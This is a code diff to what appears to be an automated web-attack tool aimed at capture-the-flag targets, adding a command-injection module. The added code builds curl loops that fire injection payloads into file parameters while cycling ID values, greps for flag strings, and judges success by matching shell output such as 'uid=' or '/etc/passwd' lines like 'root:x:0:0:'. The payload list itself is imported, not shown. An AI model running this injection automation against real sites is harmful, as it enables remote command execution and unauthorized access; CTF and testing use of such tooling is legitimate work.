@@ -12,6 +12,7 @@ import re
 import shlex
 
 from .attack_graph import (
+    CMD_INJECT_PAYLOADS,
     IDOR_IDS,
     LFI_PAYLOADS,
     REDIRECT_PAYLOADS,
@@ -78,7 +79,32 @@ def _first_param(entry: Entry, kinds: tuple[str, ...]) -> str | None:
 
 
 def _url(base_url: str, entry: Entry) -> str:
-    return base_url.rstrip("/") + entry.path
+    base = base_url.rstrip("/")
+    # 前端脚本里的接口常是相对路径（api.php?action=export），要拼回绝对地址
+    if getattr(entry, "relative", False):
+        return f"{base}/{entry.path.lstrip('/')}"
+    return base + entry.path
+
+
+def _cmd_inject_pairs(entry: Entry) -> list[dict[str, str]]:
+    """命令注入要带的参数组合。
+
+    文件名一般不是唯一参数：a-09 的导出接口还要 report_id，而只有 id=2 才
+    有权限（id=1 返回「无权导出」）。所以这里把 id 语义参数遍历 1/2/3，
+    其它参数给一个无害默认值，一条命令把组合一次打完。
+    """
+    id_params = [n for n, k in entry.params.items() if k == "id"]
+    others = {n: ("test.txt" if k == "file" else "a" if k == "search" else "1")
+              for n, k in entry.params.items() if k != "id"}
+    if not id_params:
+        return [others] if others else [{}]
+    combos = []
+    for value in ("1", "2", "3"):
+        for name in id_params:
+            combo = dict(others)
+            combo[name] = value
+            combos.append(combo)
+    return combos
 
 
 def render(edge: Edge, base_url: str) -> str | None:
@@ -152,6 +178,25 @@ def render(edge: Edge, base_url: str) -> str | None:
                 f"case \"$r\" in 30*) case \"$r\" in *login*) ;; *) "
                 f"echo LOGIN_OK \"$c\"; break;; esac;; esac; "
                 f"done" + harvest)
+
+    if edge.family == "cmd_inject" and entry:
+        name = _first_param(entry, ("file",)) or "filename"
+        url = _url(base_url, entry)
+        payloads = " ".join(_q(p) for p in CMD_INJECT_PAYLOADS)
+        calls = []
+        for combo in _cmd_inject_pairs(entry):
+            data = "&".join(f"{k}={v}" for k, v in combo.items())
+            if entry.method.upper() == "POST":
+                call = (f"curl -sS -b {SESSION_FILE} -c {SESSION_FILE} -o {SCRATCH} "
+                        f"-w '%{{http_code}}' -d {_q(data)} "
+                        f"--data-urlencode {_q(name + '=')}\"$p\" {_q(url)}")
+            else:
+                call = (f"curl -sS -b {SESSION_FILE} -c {SESSION_FILE} -o {SCRATCH} "
+                        f"-w '%{{http_code}}' --get --data {_q(data)} "
+                        f"--data-urlencode {_q(name + '=')}\"$p\" {_q(url)}")
+            calls.append(f"printf '### %s %s\\n' \"$p\" {_q(data)}; {call}; echo; "
+                         f"grep -aoE 'flag\\{{[^}}]+\\}}' {SCRATCH}")
+        return f"for p in {payloads}; do " + " ; ".join(calls) + " ; done"
 
     if edge.family == "recon":
         # 一次打完一整批敏感路径；命中的路径把正文一并打出来，图据此长出新入口。
@@ -234,6 +279,15 @@ def judge(edge: Edge, output: str) -> dict:
             return {"state": "worked", "flags": flags, "caps": caps,
                     "note": "登录成功，会话已写入 " + SESSION_FILE}
         return {"state": "failed", "flags": flags, "caps": caps, "note": "常见凭据均未登录成功"}
+
+    if edge.family == "cmd_inject":
+        if re.search(r"uid=\d+\([\w.-]+\)|www-data|root:x:0:0:", body):
+            caps.append(("rce", edge.entry.key if edge.entry else "global",
+                         "参数可注入 shell 命令"))
+            return {"state": "worked", "flags": flags, "caps": caps,
+                    "note": "确认命令注入（命令执行结果回显）"}
+        return {"state": "failed", "flags": flags, "caps": caps,
+                "note": "未见命令执行回显"}
 
     if edge.family == "open_redirect":
         match = re.search(r"30[127]\s+http://example\.com", body)
